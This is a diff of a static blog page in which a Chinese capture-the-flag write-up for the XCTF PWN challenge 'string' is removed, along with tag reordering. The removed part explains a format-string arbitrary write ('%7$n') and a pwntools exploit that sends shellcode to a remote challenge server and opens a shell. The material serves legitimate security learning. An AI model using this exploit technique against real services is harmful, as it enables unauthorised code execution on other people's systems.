@@ -176,24 +176,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>这题挺复杂的，为了设个题特地做了个有趣（？）的文字冒险游戏。<br>而且文字量挺大的。说实话我也是看了其他人的wp才做出来的，而且据说是pwn新手区难度很大的一题。主要是观察比较困难，而且程序代码整体阅读有一定的难度。但是它解题的逻辑倒挺简单的：就是通过格式化字符串漏洞修改变量的值使条件满足，向一段内存中写入shellcode并用函数指针强制转换类型使之可执行。</p>
-<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h4><p>一些无关紧要的部分省略。</p>
-<p>先查看一下保护：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/1.png"><br>发现只有PIE保护没开，所以多半不是栈题。<em>（其实题目string已经暗示这很有可能是利用格式化字符串漏洞了。）</em><br>拖入IDA中查看<em>（这里我为了好理解改了一些变量或函数的名称。）</em>，<del>之前试运行过，为了找程序主逻辑。</del><br>其中主函数的伪C代码如下：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/2.png"><br>结合之前试运行的结果，可以看出里面主要函数是play()。并且在这之前给了我们v4[0]和v4[1]的地址。<br>play传递了v4。<br>查看play()，伪C代码如下：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/3.png"><br>这个主体是让你取个长度＜12的名字，并依次执行我改过名为choose()，target()，和getshell()的函数。<br>到这里还没有什么漏洞可以利用。<br>查看choose()，如下：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/4.png"><br>这里的文本比较长，前面的文本都没什么用（纯粹剧情需要，对解题没什么帮助）,然后就来到为我们的巫师主角选择方向的时候了！<del>撒，一库马修！</del><br>其实但凡能看懂都知道这个选择就是个寂寞。从代码逻辑上分析可以发现——这完全没得选啊！只能选east。<br><em>（也好，省去了多分支的麻烦……）</em><br>然后再查看target()，这里是选择了east后会执行的函数。如下图：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/5.png"><br>可以观察到有很明显的格式化字符串漏洞，然后之前有个让我们输入地址的操作。这里的利用目前还不太明确，先观察一下getshell()：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/6.png"><br>可以看出，如果v4[0]==v4[1],那么则可以向v1内读入至多0x100的数据，并且这些数据可以被当成函数来执行。<em>（函数指针强制类型转换，具体用法我也不太清楚）</em><br>那么现在我们要想的就是<strong>如何使v4[0]等于v4[1]。</strong><br><em>（这里其实我改过变量名，最开始IDA里用的好像是a1，但通过参数传递的跟踪可以发现这里的a1就是主函数的v4，因此为了好理解就把a1改名为v4了。同样的情况在之前的一些函数中也有，这里不一一赘述。）</em><br>那么如何使条件满足呢？我们知道主函数中这两个的值并不相等，而且也没有明显的地方可以给我们直接更改其中某个的值。这时候就该利用刚才的<strong>格式化字符串漏洞实现任意地址写。</strong></p>
-<blockquote>
-<p>我们知道，格式化字符串%n可以将它前面的字符长度数赋值给一个整型变量等。<br>且在有格式化字符串漏洞的情况下可以用%k$n将其前面的字符长度数赋值给偏移该函数为k的参数。</p>
-</blockquote>
-<p>现在我们需要做的就是确定其中一个（这里以v4[0]为例）的偏移。</p>
-<p>回到刚才的target()，刚刚提到，之前有个输入地址的操作，运行进行测试看看如何利用。<br>运行程序，如下图：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/7.png"><br>运行至输入地址部分，输入65535（0xffff）。再在下一个输入处输入一连串%x。如下：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/8.png"><br>可以看出，<strong>偏移为7。</strong><br>因此这个输入地址的作用就是<strong>将输入的地址处的偏移改为7。</strong>（虽然具体的原理我不清楚……<em>有没有大佬能告诉我？</em>）<br>因此，只要输入的地址为之前告诉我们的v4[0]或v4[1]，再结合后面的格式化字符串漏洞就可达到改变其中一个的值使条件满足，之后再输入shellcode就可以获取shell权限了。</p>
-<h4 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h4><p>根据思路，exp可以这样写：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./string&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">58865</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">85</span>+<span class="string">b&#x27;%7$n&#x27;</span>    <span class="comment">#若用secret[1]这里的85要改为68。</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)    <span class="comment">#此处也可以用secret[1]。</span></span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">7</span>),<span class="number">16</span>)    <span class="comment">#获取地址。</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;ssss&#x27;</span>)    <span class="comment">#帅气的名字。(bushi)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;east&#x27;</span>)    <span class="comment">#莫得选择的east...</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)    <span class="comment">#选择1让游戏进行下去。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(addr))    <span class="comment">#sendline传输的是字符串，且%ld的格式不需要打包。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;And, you wish is:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>执行完后效果如下：<br><img src="/2021/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAstring/9.png"><br><em>（flag已打码。）</em></p>
-<h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h4><ul>
-<li>做这种题一定得有耐心。</li>
-<li>像这种格式化字符串漏洞的题，如果涉及到要求<strong>某个整型数据为某一特定值</strong>或者要求满足<strong>两数据相等</strong>的情况一般都是涉及任意地址写。</li>
-<li>还有就是偏移的获取，如果题目中有明显可以输入某个地址的地方，一般就要利用这里来获取我们要改变的变量等的偏移。<em>（毕竟一般不会无缘无故给你一个看着就很奇怪的输入。）</em></li>
-<li>另外就是程序告诉你的地址肯定是有用的。<em>（不过可能不一定全部都要用到，因为有可能有多种方法。）</em></li>
-<li>最后就是虽然开启了NX保护，但有函数指针，所以shellcode依然可以被执行。</li>
-</ul>
-
+<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h4>
+        
       
 
       
@@ -402,11 +386,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">真题</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">真题</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -688,11 +672,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -1094,15 +1078,15 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
         		</li>
       		
 		</ul>
@@ -1271,18 +1255,6 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Linux指令</a>
               </li>
              
@@ -1295,7 +1267,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">真题</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1303,11 +1283,27 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">题目</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Assembly</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">栈</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据存储</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">调用约定</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">题目</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1332,18 +1328,6 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">函数指针</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Assembly</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据存储</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">调用约定</a>
               </li>
              
               <li class="article-tag-list-item">
